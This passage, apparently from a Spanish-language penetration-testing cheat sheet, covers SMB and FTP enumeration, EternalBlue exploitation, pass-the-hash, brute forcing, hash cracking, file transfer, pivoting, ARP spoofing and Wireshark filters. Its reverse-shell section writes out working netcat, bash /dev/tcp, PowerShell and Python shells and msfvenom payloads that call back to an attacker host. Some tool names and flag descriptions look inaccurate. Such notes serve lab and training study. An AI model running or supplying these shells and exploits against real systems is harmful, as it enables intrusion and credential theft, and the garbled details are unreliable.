| `nmap -p 445 --script=smb-security-mode 10.10.10.10` | Verificar la configuración de seguridad de un servidor SMB (por ejemplo, si permite autenticación anónima). |

## Acceso a recursos SMB

| **Comando**                                      | **Descripción** |
|--------------------------------------------------|-----------------|
| `smbclient //10.10.10.10/share -U user`           | Acceder a un recurso compartido SMB usando un usuario válido. El comando pedirá la contraseña. |
| `smbclient //10.10.10.10/share -U "user%password"`| Acceder a un recurso SMB pasando las credenciales en el mismo comando. (Asegúrate de reemplazar `user` y `password` por las credenciales correctas). |
| `mount -t cifs //10.10.10.10/share /mnt/share -o username=user,password=password` | Montar un recurso compartido SMB en un sistema Linux para acceder a los archivos como si fuera un directorio local. |
| `smbget -R smb://10.10.10.10/share`              | Descargar recursivamente archivos de un recurso SMB. |
| `smbclient //10.10.10.10/share`                  | Interactuar con un recurso compartido SMB desde la línea de comandos, donde podrás navegar y copiar archivos. |
| `smbmap -H 10.10.10.10 -u "user" -p "password"`   | Acceder a los recursos compartidos en SMB con credenciales específicas, lo que te permitirá realizar acciones como copiar, borrar o modificar archivos. |

## Exploiting Vulnerabilidades SMB

### EternalBlue (MS17-010)
| **Comando**                                      | **Descripción** |
|--------------------------------------------------|-----------------|
| `msfconsole`                                     | Iniciar Metasploit para realizar ataques de explotación. |
| `use exploit/windows/smb/ms17_010_eternalblue`   | Cargar el exploit para la vulnerabilidad MS17-010 (EternalBlue). |
| `set RHOSTS 10.10.10.10`                         | Configurar la dirección IP del objetivo. |
| `set PAYLOAD windows/x64/meterpreter/reverse_tcp` | Establecer el payload, en este caso, un reverse shell para Windows. |
| `set LHOST 10.10.10.20`                          | Configurar la IP de tu máquina (servidor de escucha). |
| `run`                                            | Ejecutar el exploit. |

### SMB Relay
| **Comando**                                      | **Descripción** |
|--------------------------------------------------|-----------------|
| `impacket-smbrelay.py -t 10.10.10.10 -u user -p password` | Realizar un ataque SMB relay para interceptar las credenciales y realizar acciones sobre otros hosts. |
| `smbclient //10.10.10.10/share`                  | Acceder a un recurso compartido SMB y probar técnicas de SMB relay. |

### Pass-the-Hash (PTH)
| **Comando**                                      | **Descripción** |
|--------------------------------------------------|-----------------|
| `pth-winexe -U user%hash -domain DOMAIN 10.10.10.10 "cmd.exe"` | Utilizar el hash de la contraseña de un usuario para autenticarte sin necesidad de la contraseña en texto claro. |
| `impacket-pth`                                   | Herramienta para realizar ataques de Pass-the-Hash en redes SMB. |

## Prevención de Vulnerabilidades SMB

1. **Deshabilitar SMBv1**: Asegúrate de que SMBv1 esté deshabilitado en la red, ya que es vulnerable a muchos ataques (como EternalBlue).
   - En Windows, puedes deshabilitar SMBv1 con el siguiente comando:
     ```bash
     sc config lanmanworkstation depend= bowser/mrxsmb20/nsi
     ```
   
2. **Uso de firewalls**: Configura los firewalls para bloquear puertos SMB (445, 139) de la red externa, permitiendo solo tráfico SMB dentro de la red interna.

## Acceso a recursos SMB

| **Comando**                                               | **Descripción** |
|-----------------------------------------------------------|-----------------|
| `smbclient //10.10.10.10/backups`                          | Acceder a un recurso compartido SMB (en este caso `backups`) sin especificar usuario ni contraseña, dependiendo de la configuración del recurso. |
| `smbclient //10.10.10.10/share -U user`                    | Acceder a un recurso compartido SMB proporcionando el nombre de usuario para autenticarse. El sistema pedirá la contraseña. |
| `smbclient //10.10.10.10/share -U "user%password"`         | Acceder a un recurso SMB especificando las credenciales en un solo comando (nombre de usuario y contraseña). |
| `mount -t cifs //10.10.10.10/backups /mnt/backups -o username=user,password=password` | Montar un recurso SMB en Linux (reemplazar `user` y `password` por las credenciales correctas) para acceder a los archivos como si fueran parte del sistema de archivos local. |
| `smbclient //10.10.10.10/backups -N`                       | Acceder a un recurso SMB sin necesidad de autenticación si el recurso permite acceso anónimo. |
| `smbclient //10.10.10.10/backups -U "admin%password"`      | Acceder a un recurso SMB utilizando el usuario "admin" y la contraseña "password". Se pueden reemplazar con otros valores. |
| `smbget -R smb://10.10.10.10/backups`                      | Descargar archivos recursivamente de un recurso compartido SMB a través de `smbget`, útil para hacer una descarga masiva de archivos. |
| `smbmap -H 10.10.10.10 -u "user" -p "password"`            | Acceder a los recursos compartidos SMB especificando un usuario y una contraseña, y obtener información sobre los permisos y el contenido de esos recursos. |
| `smbclient -L 10.10.10.10 -U "user"`                       | Enumerar todos los recursos compartidos disponibles en el servidor SMB, proporcionando un nombre de usuario para autenticación. |
| `smbclient //10.10.10.10/share`                            | Interactuar de forma interactiva con un recurso SMB. Este comando te permite navegar por el recurso y realizar operaciones como subir, descargar, listar archivos, etc. |
| `net use \\10.10.10.10\share password /user:user`          | En Windows, conecta un recurso compartido SMB a una letra de unidad en el sistema, permitiendo acceder al recurso como si fuera una unidad local. |
| `smbclient //10.10.10.10/backups -N -c "get backup.zip"`   | Conectar al recurso SMB `backups` y descargar un archivo específico, en este caso `backup.zip`, usando el comando `get`. |


# FTP

## Enumeración FTP

| **Comando**                                           | **Descripción** |
|-------------------------------------------------------|-----------------|
| `nmap --script=ftp-anon -p21 10.10.10.10`             | Escanear el puerto 21 para verificar si el servidor FTP permite acceso anónimo. Usando el script `ftp-anon` de Nmap. |
| `ftp 10.10.10.10`                                     | Conectarse a un servidor FTP de forma interactiva. El comando pedirá el nombre de usuario y la contraseña. |
| `nmap -p 21 --script=ftp-syst 10.10.10.10`             | Usar el script `ftp-syst` de Nmap para obtener información sobre el sistema operativo del servidor FTP. |
| `nmap -p 21 --script=ftp-banner 10.10.10.10`          | Obtener el banner del servidor FTP para identificar el software y su versión. |
| `nc -zv 10.10.10.10 21`                               | Realizar un escaneo de puerto para verificar si el puerto 21 está abierto (específicamente para FTP). |
| `ftp -n 10.10.10.10`                                  | Conectar a un servidor FTP sin pedir credenciales automáticamente (modo no interactivo). |
| `ftp -p 10.10.10.10`                                  | Usar el modo pasivo para la conexión FTP, útil cuando se está detrás de un firewall o NAT. |
| `hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.10` | Realizar un ataque de fuerza bruta contra el servidor FTP con el nombre de usuario `admin` y una lista de contraseñas. |
| `ftp -v 10.10.10.10`                                  | Conectar al servidor FTP y ver información detallada de la conexión. |

## Acceso FTP

| **Comando**                                           | **Descripción** |
|-------------------------------------------------------|-----------------|
| `ftp 10.10.10.10`                                     | Conectarse de forma interactiva al servidor FTP. El comando pedirá el nombre de usuario y la contraseña. |
| `ftp 10.10.10.10 -p 22`                               | Conectar a un servidor FTP en el puerto 22 (algunos servidores pueden tener FTP configurado en otros puertos). |
| `ftp -n 10.10.10.10`                                  | Conectar al servidor FTP sin interacción inicial. Es útil para scripts. |
| `ftp -p 10.10.10.10`                                  | Usar el modo pasivo para conectarse, el cual es más adecuado cuando se encuentran detrás de un NAT o firewall. |
| `put file.txt`                                        | Subir el archivo `file.txt` al servidor FTP después de haberse conectado. |
| `get file.txt`                                        | Descargar el archivo `file.txt` del servidor FTP. |
| `mget *.txt`                                          | Descargar todos los archivos `.txt` del directorio remoto al directorio local. |
| `mput *.txt`                                          | Subir todos los archivos `.txt` desde el directorio local al servidor FTP. |

## Fuerza bruta FTP

| **Comando**                                           | **Descripción** |
|-------------------------------------------------------|-----------------|
| `hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.10` | Ataque de fuerza bruta contra el servidor FTP con el nombre de usuario `user` y una lista de contraseñas. |
| `hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.10` | Ataque de fuerza bruta contra el servidor FTP usando un archivo de lista de usuarios (`users.txt`) y una lista de contraseñas (`rockyou.txt`). |
| `medusa -h 10.10.10.10 -u user -P /usr/share/wordlists/rockyou.txt ftp` | Realizar un ataque de fuerza bruta usando Medusa en lugar de Hydra, con el mismo objetivo. |

## Transferencia de Archivos con FTP

| **Comando**                                           | **Descripción** |
|-------------------------------------------------------|-----------------|
| `ftp -i 10.10.10.10`                                  | Conectarse al servidor FTP y desactivar el modo interactivo (útil para la automatización). |
| `ftp -n -p 10.10.10.10`                               | Conexión FTP sin autenticación inicial y usando modo pasivo para las transferencias. |
| `get file.txt`                                        | Descargar el archivo `file.txt` del servidor FTP a la máquina local. |
| `put file.txt`                                        | Subir el archivo `file.txt` desde la máquina local al servidor FTP. |
| `lcd /local/directory`                                | Cambiar el directorio local donde se almacenarán los archivos descargados. |
| `cd /remote/directory`                                | Cambiar el directorio remoto en el servidor FTP donde se encuentran los archivos que deseas manipular. |

# Cracking de contraseñas

## John the Ripper

| **Comando**                                                             | **Descripción** |
|-------------------------------------------------------------------------|-----------------|
| `john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`            | Utilizar John the Ripper para crackear contraseñas utilizando un archivo de hashes y una lista de palabras (en este caso `rockyou.txt`). |
| `john --incremental hashes.txt`                                          | Usar el modo `incremental` de John the Ripper para probar todas las combinaciones posibles de caracteres en el archivo de hashes. |
| `john --rules --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`     | Usar John the Ripper con reglas específicas que modifican las palabras en el archivo `rockyou.txt` para intentar crear contraseñas más complejas. |
| `john --show hashes.txt`                                                 | Mostrar las contraseñas que han sido descifradas hasta el momento desde el archivo de hashes. |
| `john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt` | Crackear contraseñas almacenadas en el formato MD5 usando una lista de palabras. |
| `john --restore`                                                        | Continuar el cracking de contraseñas desde un punto de interrupción previo. |

## Hashcat

| **Comando**                                                             | **Descripción** |
|-------------------------------------------------------------------------|-----------------|
| `hashcat -m 1000 crack.hash /usr/share/wordlists/rockyou.txt`            | Crackear un hash NTLM (tipo 1000) utilizando la lista de contraseñas `rockyou.txt`. |
| `hashcat -m 0 crack.hash /usr/share/wordlists/rockyou.txt`               | Crackear un hash MD5 utilizando `rockyou.txt` como archivo de palabras. |
| `hashcat -m 1800 crack.hash /usr/share/wordlists/rockyou.txt`            | Crackear un hash SHA512-crypt, un formato común de contraseñas de Linux. |
| `hashcat -m 400 -a 3 crack.hash ?a?a?a?a?a?a`                           | Realizar un ataque de diccionario con caracteres especiales (`?a` abarca letras, números y caracteres especiales) en el hash utilizando el modo de ataque 3. |
| `hashcat -m 0 crack.hash --force`                                        | Forzar el uso de Hashcat en caso de que se detecten problemas de configuración (aunque no es recomendable). |
| `hashcat -m 1000 crack.hash --status`                                    | Mostrar el estado del cracking mientras se ejecuta Hashcat. |
| `hashcat -m 1000 crack.hash /usr/share/wordlists/rockyou.txt --rule`     | Usar Hashcat con un conjunto de reglas para modificar las palabras de la lista `rockyou.txt` y probar combinaciones más complejas. |

## Otros Métodos de Cracking

| **Comando**                                                             | **Descripción** |
|-------------------------------------------------------------------------|-----------------|
| `medusa -h 10.10.10.10 -u user -P /usr/share/wordlists/rockyou.txt ssh`  | Realizar un ataque de fuerza bruta contra un servidor SSH con Medusa, usando una lista de contraseñas `rockyou.txt`. |
| `hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.10`   | Ataque de fuerza bruta contra un servidor FTP con el nombre de usuario `admin` y una lista de contraseñas. |
| `john --show --format=raw-md5 hashes.txt`                                | Mostrar las contraseñas que han sido descifradas a partir de un archivo de hashes MD5. |


# Transferir archivos

## Certutil

| **Comando**                                                                 | **Descripción** |
|-----------------------------------------------------------------------------|-----------------|
| `certutil -urlcache -f http://10.10.10.10/test.exe test.exe`                | Utilizar `certutil` para descargar un archivo desde un servidor HTTP. Este comando es útil cuando estamos trabajando en un entorno Windows y necesitamos transferir archivos a través de HTTP. |

## SCP (Secure Copy)

| **Comando**                                                                 | **Descripción** |
|-----------------------------------------------------------------------------|-----------------|
| `scp /path/to/file username@remote:/path/to/destination`                    | Transferir un archivo a una máquina remota utilizando SCP (Secure Copy Protocol). El comando transfiere el archivo desde la máquina local al destino especificado en la máquina remota. |
| `scp username@remote:/path/to/file /local/path`                              | Descargar un archivo de una máquina remota hacia la máquina local utilizando SCP. |
| `scp -r /local/folder username@remote:/remote/folder`                        | Transferir una carpeta completa desde la máquina local a la remota. El parámetro `-r` se usa para copiar directorios recursivamente. |

## HTTP (Usando Python como servidor)

| **Comando**                                                                 | **Descripción** |
|-----------------------------------------------------------------------------|-----------------|
| `python3 -m http.server 8080`                                                | Iniciar un servidor HTTP simple en el puerto 8080 para servir archivos. Esto permite transferir archivos a través de HTTP utilizando un navegador web o `wget`/`curl`. |
| `python3 -m http.server 8000 --bind 10.10.10.10`                             | Iniciar un servidor HTTP en el puerto 8000 y vincularlo a una IP específica (`10.10.10.10` en este caso). Este comando es útil cuando necesitas servir archivos en una red específica. |

## Otros Métodos de Transferencia de Archivos

| **Comando**                                                                 | **Descripción** |
|-----------------------------------------------------------------------------|-----------------|
| `wget http://10.10.10.10/test.exe`                                           | Descargar un archivo desde un servidor HTTP utilizando `wget`, que es una herramienta común en Linux. |
| `curl -O http://10.10.10.10/test.exe`                                        | Descargar un archivo usando `curl`. Similar a `wget`, pero más versátil, ya que permite opciones avanzadas de transferencia. |
| `rsync -avz /local/folder username@remote:/remote/folder`                    | Transferir archivos de forma eficiente utilizando `rsync`. Es muy útil para sincronizar directorios entre máquinas locales y remotas. |

## Transferencia usando SMB

| **Comando**                                                                 | **Descripción** |
|-----------------------------------------------------------------------------|-----------------|
| `smbclient //10.10.10.10/share -U user`                                      | Conectarse a un recurso compartido SMB y transferir archivos utilizando `smbclient`. Una vez dentro del recurso compartido, puedes usar comandos como `get` para descargar y `put` para cargar archivos. |
| `smbclient //10.10.10.10/share -U user -c "get file.txt"`                    | Descargar un archivo `file.txt` desde un recurso compartido SMB especificado. |

# Reverse Shell

## Netcat
Netcat es una herramienta muy útil para establecer conexiones de red. Se usa comúnmente para obtener shells inversos. Aquí algunos ejemplos comunes:

| **Comando**                       | **Descripción**                                             |
|-----------------------------------|-------------------------------------------------------------|
| `nc -nlvp 443`                    | Inicia un listener en el puerto 443 (escucha de forma pasiva).|
| `nc.exe 10.10.10.10 444 -e cmd.exe` | Conectar a una máquina remota en 10.10.10.10 por el puerto 444 y ejecutar `cmd.exe` (Windows).|
| `nc -e /bin/bash 10.10.10.10 4444` | Conecta a un host remoto y ejecuta bash (Linux).             |
| `nc -lvp 4444`                    | Inicia Netcat en modo escucha en el puerto 4444.             |

### Explicación:
- `-l` : Indica que Netcat debe escuchar (modo servidor).
- `-v` : Modo verboso, para ver detalles de la conexión.
- `-p` : Especifica el puerto.
- `-e` : Indica el programa que se debe ejecutar al recibir una conexión.

## Metasploit
Metasploit es una de las herramientas más completas para explotación, incluyendo la generación de payloads para reverse shells. Los ejemplos a continuación muestran cómo generar un reverse shell en sistemas Windows.

| **Comando**                                                     | **Descripción**                                                                                  |
|-----------------------------------------------------------------|--------------------------------------------------------------------------------------------------|
| `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe > shell.exe` | Genera un payload para Windows que conecta de vuelta a la IP `10.10.10.10` en el puerto 443. Guarda el payload en `shell.exe`. |
| `msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf > shell.elf` | Genera un payload para Linux (32 bits), que conecta de vuelta al atacante en el puerto 4444. |
| `msfconsole`                                                   | Inicia Metasploit Framework. Desde aquí, puedes cargar el payload, configurarlo y explotarlo.    |
| `use exploit/multi/handler`                                     | Carga el módulo de Metasploit para manejar el payload generado y esperar conexiones entrantes.  |
| `set PAYLOAD windows/shell_reverse_tcp`                         | Configura el tipo de payload para un shell inverso en sistemas Windows.                           |
| `set LHOST 10.10.10.10`                                         | Establece la IP del atacante para que el payload se conecte a esta dirección.                    |
| `set LPORT 4444`                                                | Establece el puerto de escucha en el atacante.                                                   |
| `exploit`                                                       | Ejecuta el exploit, esperando la conexión del payload.                                           |

### Explicación:
- **msfvenom**: Genera un payload que, cuando se ejecuta en el sistema víctima, abrirá una conexión de shell inverso al host atacante.
- **Metasploit Framework**: Usado para gestionar y ejecutar los exploits. Debes configurar un listener y esperar la conexión del payload generado.

## Bash Reverse Shell
En sistemas basados en Unix/Linux, es posible ejecutar un reverse shell usando simplemente Bash. Aquí algunos ejemplos:

| **Comando**                              | **Descripción**                                                     |
|------------------------------------------|---------------------------------------------------------------------|
| `bash -i >& /dev/tcp/10.10.10.10/4444 0>&1` | Reverse shell utilizando Bash, conecta al atacante en `10.10.10.10` y al puerto `4444`. |
| `nc -e /bin/bash 10.10.10.10 4444`       | Similar al anterior, pero usando `nc` para iniciar la conexión.      |

### Explicación:
- **Bash**: Utiliza redirección para establecer una conexión con el host atacante.
- **/dev/tcp**: Es una forma especial en Linux para crear conexiones de red directamente desde Bash.

## Powershell Reverse Shell

En sistemas Windows, se puede usar PowerShell para obtener un reverse shell de manera bastante discreta:

| **Comando**                                                                                                                                                                                                 |
|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object Text.Encoding).GetString($bytes, 0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush()}"` |

### Explicación:
- **Powershell**: Utiliza las capacidades de red de PowerShell para conectarse al host atacante y ejecutar comandos en la máquina víctima.
- **-nop**: Deshabilita la política de ejecución de scripts, permitiendo que el comando se ejecute sin restricciones.

## Reverse Shell en Python
También es posible crear un reverse shell utilizando Python, muy útil si Python está disponible en el sistema:

| **Comando**                                                                                     | 
|-------------------------------------------------------------------------------------------------|
| `python -c 'import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("10.10.10.10",4444)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p=subprocess.call(["/bin/sh", "-i"]);'` | Reverse shell en Python que conecta al atacante en `10.10.10.10` en el puerto `4444`. |

### Explicación:
- **Python**: Usa `socket` para establecer la conexión y `subprocess` para ejecutar un shell en la máquina víctima.


# Post Explotación

## Pivoting
El pivoting es una técnica que se utiliza después de haber obtenido acceso a una máquina en una red. Permite redirigir el tráfico a través de la máquina comprometida para acceder a otros segmentos de red que no son directamente accesibles desde el atacante. Aquí algunos ejemplos comunes:

| **Comando**                                                      | **Descripción**                                                                                     |
|------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------|
| `ip route add 10.10.16.0/24 via 10.10.16.1 dev tap0`             | Agrega una ruta estática en el sistema comprometido, permitiendo el acceso a la red `10.10.16.0/24` a través de la interfaz `tap0`.|
| `run autoroute -s 10.10.16.0/24`                                  | En Metasploit, el comando `autoroute` permite habilitar el pivoting dinámico a través de la sesión actual, redirigiendo el tráfico hacia la subred `10.10.16.0/24`.|
| `route`                                                          | Comando en Metasploit para ver las rutas de red actuales. Puedes verificar las rutas de pivoting habilitadas con este comando.|
| `route add 10.10.20.0/24 10.10.10.10`                            | Añade una ruta estática en Metasploit para enrutar el tráfico a través de la máquina comprometida (`10.10.10.10`), alcanzando la red `10.10.20.0/24`.|
| `setg RHOST 10.10.16.10`                                         | Cambia la dirección del host de destino para los exploits en Metasploit cuando usas pivoting. Establece `RHOST` al nuevo host accesible a través del pivot.|
| `use auxiliary/spoof/arp_poisoning`                              | Utiliza ARP Spoofing para redirigir el tráfico de otras máquinas en la red interna a través de tu máquina comprometida. Esto permite interceptar o modificar el tráfico.|
| `run post/windows/gather/enum_patches`                            | Un módulo de post-explotación en Metasploit que puede ser utilizado para obtener información adicional del sistema comprometido, útil en escenarios de pivoting. |

### Explicación:
- **Pivoting**: Es una técnica crucial para avanzar en la red después de obtener acceso a una máquina que tiene acceso a otras partes de la red.
- **Rutas estáticas**: Modificar las rutas de red en la máquina comprometida permite enrutar el tráfico hacia subredes que no son accesibles directamente desde el atacante.
- **Metasploit**: El framework ofrece herramientas y módulos que facilitan el pivoting, haciendo más sencillo el ataque en redes internas.
- **ARP Spoofing**: Una técnica que permite engañar a otros dispositivos de la red para que su tráfico pase a través de la máquina del atacante, permitiendo así intercepciones o modificaciones.


# Wireshark

Wireshark es una herramienta esencial para capturar y analizar tráfico de red. Se utiliza principalmente para la observación y resolución de problemas de tráfico en la red, así como para la detección de vulnerabilidades. Aquí algunos filtros y comandos útiles en Wireshark:

| **Comando**                       | **Descripción**                                                                                     |
|-----------------------------------|-----------------------------------------------------------------------------------------------------|
| `ip.addr == 192.168.12.1`         | Filtra todo el tráfico que pasa a través de la IP `192.168.12.1`, ya sea como origen o destino. Esto es útil para rastrear actividades de un dispositivo específico. |
| `tcp.port == 80`                  | Filtra el tráfico TCP en el puerto 80, comúnmente utilizado para HTTP. Puedes observar solicitudes y respuestas HTTP para análisis de seguridad. |
| `ip.src == 192.168.1.10`          | Filtra los paquetes cuyo origen es la IP `192.168.1.10`. Ideal para estudiar la actividad de un host específico. |
| `http.request`                    | Muestra solo los paquetes de solicitud HTTP. Es útil para analizar solicitudes y verificar si hay vulnerabilidades como inyecciones SQL o XSS. |
| `http.response`                   | Muestra solo las respuestas HTTP, lo que puede ser útil para ver cómo los servidores responden a las solicitudes y verificar posibles fugas de datos. |
| `tcp.flags.syn == 1`              | Filtra los paquetes TCP con la bandera SYN activada. Usado principalmente para detectar escaneos de puertos y ataques de denegación de servicio (DoS). |
| `tcp.stream eq 0`                 | Filtra y muestra el flujo de comunicación en un único stream TCP, ideal para hacer seguimiento a una conversación completa entre el cliente y el servidor. |
| `dns`                             | Filtra los paquetes DNS. Es útil para analizar consultas DNS y detectar posibles problemas o configuraciones incorrectas en el sistema de resolución de nombres. |
| `icmp`                            | Muestra solo los paquetes ICMP, que se usan para diagnosticarse en redes. Puede ayudar a detectar ataques DoS basados en ICMP o explorar la conectividad de la red. |
| `tcp.contains "GET"`              | Filtra paquetes TCP que contienen la cadena `"GET"`. Esto es útil para ver las solicitudes HTTP GET enviadas a servidores web, muy útil en pruebas de penetración para analizar la web. |
| `eth.addr == 00:14:22:01:23:45`   | Filtra los paquetes que tienen como dirección MAC el valor `00:14:22:01:23:45`. Es útil cuando necesitas rastrear a un dispositivo específico a nivel de capa 2 (Ethernet). |
| `http contains "password"`        | Filtra las respuestas HTTP que contienen la palabra "password", útil para detectar fugas de datos sensibles en el tráfico de la red. |
| `ssl.record.version == 0x0303`    | Filtra el tráfico SSL/TLS con la versión 1.2 (`0x0303`), útil para revisar las conexiones seguras y asegurarse de que se utilicen configuraciones adecuadas. |
| `frame.len > 128`                 | Filtra los paquetes cuya longitud es mayor a 128 bytes. Esto puede ayudar a reducir el número de paquetes capturados y enfocarse solo en los que contienen información útil. |
| `tcp.analysis.flags`              | Muestra paquetes que contienen análisis TCP, útil para ver los detalles de los flujos de datos TCP, como retransmisiones o paquetes perdidos. |

### Explicación:
- **Filtrado**: Los filtros de Wireshark te permiten centrarse en tráfico específico, facilitando la tarea de análisis.
- **Análisis de tráfico HTTP**: Capturar y analizar el tráfico HTTP es esencial en pruebas de penetración y auditorías de seguridad, pues permite detectar vulnerabilidades en las aplicaciones web.
- **Seguimiento de TCP Streams**: Permite seguir una conversación completa entre el cliente y el servidor, ideal para analizar transacciones y detectar anomalías.
- **Inspección de tráfico ICMP y DNS**: A menudo se pasan por alto, pero son vitales para la resolución de problemas de red y la detección de configuraciones incorrectas o ataques.


